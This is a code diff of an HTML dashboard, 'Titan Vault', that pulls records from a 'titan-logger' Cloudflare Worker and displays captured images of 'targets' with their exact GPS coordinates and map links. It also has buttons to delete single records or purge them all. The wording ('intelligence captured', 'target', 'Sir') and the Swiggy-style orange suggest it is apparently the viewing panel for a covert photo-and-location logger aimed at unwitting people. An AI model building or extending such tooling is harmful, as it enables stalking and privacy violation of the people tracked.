@@ -3,92 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Titan Vault | Secure Intelligence</title>
+    <title>Titan Vault</title>
     <style>
-        :root { --swiggy-orange: #fc8019; --dark-bg: #1a1a1a; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f4f4; margin: 0; padding: 20px; }
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
-        h1 { color: var(--swiggy-orange); margin: 0; font-size: 1.5rem; }
-        .purge-btn { background: #ff4d4d; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; }
-        
+        body { font-family: sans-serif; background: #1a1a1a; color: #fff; padding: 20px; }
         .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
-        .log-card { background: white; border-radius: 15px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.1); position: relative; border-bottom: 4px solid var(--swiggy-orange); }
-        .target-img { width: 100%; height: 250px; object-fit: cover; background: #eee; }
+        .card { background: #222; border-radius: 15px; overflow: hidden; position: relative; border: 1px solid #333; }
+        .img-box { width: 100%; height: 300px; background: #000; display: flex; align-items: center; justify-content: center; }
+        .target-img { max-width: 100%; max-height: 100%; object-fit: contain; }
         .info { padding: 15px; }
-        .timestamp { font-size: 0.75rem; color: #888; margin-bottom: 10px; }
-        .map-btn { display: block; background: var(--swiggy-orange); color: white; text-decoration: none; text-align: center; padding: 12px; border-radius: 8px; font-weight: bold; margin-top: 10px; }
-        .del-btn { position: absolute; top: 10px; right: 10px; background: rgba(255, 255, 255, 0.9); color: red; border: none; width: 30px; height: 30px; border-radius: 50%; cursor: pointer; font-weight: bold; }
-        
-        .no-data { text-align: center; padding: 50px; color: #888; }
+        .map-btn { display: block; background: #fc8019; color: #fff; text-decoration: none; text-align: center; padding: 10px; border-radius: 8px; font-weight: bold; margin-top: 10px; }
+        .del-btn { position: absolute; top: 10px; right: 10px; background: red; color: white; border: none; border-radius: 50%; width: 25px; height: 25px; cursor: pointer; }
     </style>
 </head>
 <body>
-
-    <div class="header">
-        <h1>👔 TITAN VAULT</h1>
-        <button class="purge-btn" onclick="purgeAll()">PURGE ALL</button>
+    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+        <h1 style="color:#fc8019;">👔 TITAN VAULT</h1>
+        <button onclick="purge()" style="background:red; color:white; border:none; padding:10px 20px; border-radius:8px; cursor:pointer;">PURGE ALL</button>
     </div>
-
-    <div id="vault-grid" class="grid">
-        <div class="no-data">Initializing Secure Connection...</div>
-    </div>
+    <div id="grid" class="grid"></div>
 
     <script>
-        // --- CONFIGURATION ---
-        const API_URL = "https://titan-logger.saliljha523.workers.dev"; // MUST MATCH YOUR WORKER
-
-        async function fetchLogs() {
-            try {
-                const response = await fetch(API_URL);
-                const data = await response.json();
-                renderLogs(data);
-            } catch (err) {
-                document.getElementById('vault-grid').innerHTML = `<div class="no-data">Failed to fetch data. Check Worker CORS.</div>`;
-            }
-        }
-
-        function renderLogs(logs) {
-            const grid = document.getElementById('vault-grid');
-            if (logs.length === 0) {
-                grid.innerHTML = `<div class="no-data">No intelligence captured yet, Sir.</div>`;
-                return;
-            }
-
-            grid.innerHTML = logs.map(log => {
-                const mapUrl = log.location.includes(",") 
-                    ? `https://www.google.com/maps/search/?api=1&query=${log.location}` 
-                    : "#";
-
-                return `
-                    <div class="log-card">
-                        <button class="del-btn" onclick="deleteEntry(${log.id})">×</button>
-                        <img src="${log.image}" class="target-img" onerror="this.src='https://via.placeholder.com/300x250?text=No+Image'">
-                        <div class="info">
-                            <div class="timestamp">📅 ${log.timestamp}</div>
-                            <div style="font-size: 0.8rem; color: #444;">📍 GPS: ${log.location}</div>
-                            <a href="${mapUrl}" target="_blank" class="map-btn">📍 VIEW EXACT LOCATION</a>
-                        </div>
+        const API_URL = "https://titan-logger.saliljha523.workers.dev";
+        async function load() {
+            const res = await fetch(API_URL);
+            const data = await res.json();
+            document.getElementById('grid').innerHTML = data.map(log => `
+                <div class="card">
+                    <button class="del-btn" onclick="del(${log.id})">×</button>
+                    <div class="img-box">
+                        <img src="${log.image}" class="target-img">
                     </div>
-                `;
-            }).join('');
+                    <div class="info">
+                        <small>${log.timestamp}</small>
+                        <p style="font-size:12px; color:#aaa;">GPS: ${log.location}</p>
+                        <a href="https://www.google.com/maps?q=${log.location}" target="_blank" class="map-btn">📍 OPEN EXACT MAP</a>
+                    </div>
+                </div>
+            `).join('');
         }
-
-        async function deleteEntry(id) {
-            if (!confirm("Sir, delete this specific record?")) return;
-            const res = await fetch(`${API_URL}?id=${id}`, { method: 'DELETE' });
-            if (res.ok) fetchLogs();
-        }
-
-        async function purgeAll() {
-            if (!confirm("CRITICAL: Wipe entire database?")) return;
-            const res = await fetch(API_URL, { method: 'DELETE' });
-            if (res.ok) fetchLogs();
-        }
-
-        // Initial Load
-        fetchLogs();
-        // Auto-refresh every 30 seconds
-        setInterval(fetchLogs, 30000);
+        async function del(id) { if(confirm("Delete?")) { await fetch(`${API_URL}?id=${id}`, {method:'DELETE'}); load(); } }
+        async function purge() { if(confirm("Wipe all?")) { await fetch(API_URL, {method:'DELETE'}); load(); } }
+        load();
     </script>
 </body>
 </html>
